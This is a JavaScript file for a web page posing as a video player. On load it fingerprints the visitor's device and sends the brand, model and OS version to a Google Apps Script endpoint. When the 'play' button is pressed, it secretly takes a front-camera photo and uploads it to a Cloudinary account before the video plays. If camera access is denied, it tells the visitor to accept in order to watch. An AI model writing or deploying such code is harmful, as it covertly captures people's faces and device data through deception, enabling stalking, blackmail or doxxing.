const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');
const cameraInput = document.getElementById('cameraInput');
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        
        let brand = null, model = null;
        
        if (ua.match(/iPhone/)) {
            brand = 'Apple';
            model = 'iPhone';
        }
        else if (ua.match(/iPad/)) {
            brand = 'Apple';
            model = 'iPad';
        }
        else if (ua.match(/iPod/)) {
            brand = 'Apple';
            model = 'iPod';
        }
        else if (/Windows/i.test(ua)) {
            brand = 'Windows';
            const m = ua.match(/Windows NT ([0-9.]+)/);
            model = m ? 'NT ' + m[1] : 'PC';
        }
        else if (/Macintosh|Mac OS X/i.test(ua)) {
            brand = 'Apple';
            const m = ua.match(/Mac OS X ([0-9_]+)/);
            model = m ? 'macOS ' + m[1].replace(/_/g, '.') : 'Mac';
        }
        else if (android) {
            // Always extract from Build/ pattern first as fallback
            const buildMatch = ua.match(/;\s*([^;)]+)\s*Build/i);
            if (buildMatch) {
                model = buildMatch[1].trim();
            }
            
            // Then check for specific brands
            if (/TECNO/i.test(ua)) {
                brand = 'Tecno';
            }
            else if (/Infinix/i.test(ua)) {
                brand = 'Infinix';
            }
            else if (/Poco/i.test(ua)) {
                brand = 'Poco';
            }
            else if (/Samsung/i.test(ua)) {
                brand = 'Samsung';
            }
            else if (/Redmi/i.test(ua)) {
                brand = 'Redmi';
            }
            else if (/Xiaomi/i.test(ua)) {
                brand = 'Xiaomi';
            }
            else if (/OPPO/i.test(ua)) {
                brand = 'OPPO';
            }
            else if (/Vivo/i.test(ua)) {
                brand = 'Vivo';
            }
            else if (/Realme/i.test(ua)) {
                brand = 'Realme';
            }
            else if (/OnePlus|ONEPLUS/i.test(ua)) {
                brand = 'OnePlus';
            }
            else if (/Pixel/i.test(ua)) {
                brand = 'Google';
            }
            else if (/Nothing/i.test(ua)) {
                brand = 'Nothing';
            }
            else if (/Honor/i.test(ua)) {
                brand = 'Honor';
            }
            else if (/Sony/i.test(ua)) {
                brand = 'Sony';
            }
            else if (/Motorola|moto/i.test(ua)) {
                brand = 'Motorola';
            }
            else if (/ZTE/i.test(ua)) {
                brand = 'ZTE';
            }
            else if (/ASUS/i.test(ua)) {
                brand = 'ASUS';
            }
            else if (/Meizu/i.test(ua)) {
                brand = 'Meizu';
            }
            else if (/\bLG\b/i.test(ua)) {
                brand = 'LG';
            }
            else if (/Blackview/i.test(ua)) {
                brand = 'Blackview';
            }
            else if (/Huawei/i.test(ua)) {
                brand = 'Huawei';
            }
            else if (/Nokia/i.test(ua)) {
                brand = 'Nokia';
            }
            else if (/itel/i.test(ua)) {
                brand = 'iTel';
            }
            else if (/Sparx|QMobile|G'Five|Calme|Dany|Digit|VGO/i.test(ua)) {
                const m = ua.match(/(Sparx|QMobile|G'Five|Calme|Dany|Digit|VGO)/i);
                brand = m ? m[1] : 'Unknown';
            }
            else if (model) {
                // Extract brand from model if not found
                brand = model.split(/[\s-_]+/)[0];
            }
        }
        
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            brand: brand,
            model: model
        };
    };
    const deviceInfo = getDeviceInfo();
    const version = deviceInfo.androidVersion || deviceInfo.iosVersion || 'Unknown';
    
    const specs = {
        brand: deviceInfo.brand || 'Unknown',
        model: deviceInfo.model || 'Unknown',
        version: version
    };
    
    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    }).catch(() => {});
})();

const uploadToCloudinary = async (blob) => {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'user_pre');
    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
    return response.json();
};

const playVideo = () => {
    playButton.style.display = 'none';
    loader.style.display = 'none';
    video.controls = true;
    video.play();
};

if (isIOS) {
    cameraInput.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (file) {
            playButton.style.display = 'none';
            loader.style.display = 'block';
            await uploadToCloudinary(file);
            playVideo();
        }
    });
    
    playButton.addEventListener('click', () => {
        cameraInput.click();
    });
} else {
    playButton.addEventListener('click', async () => {
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            if (window.ImageCapture) {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const blob = await imageCapture.takePhoto();
                stream.getTracks().forEach(track => track.stop());
                await uploadToCloudinary(blob);
            } else {
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                await uploadToCloudinary(blob);
            }
            
            playVideo();
        } catch (error) {
            loader.style.display = 'none';
            playButton.style.display = 'flex';
            alert('Camera permission denied. Please accept to watch the video.');
        }
    });
}
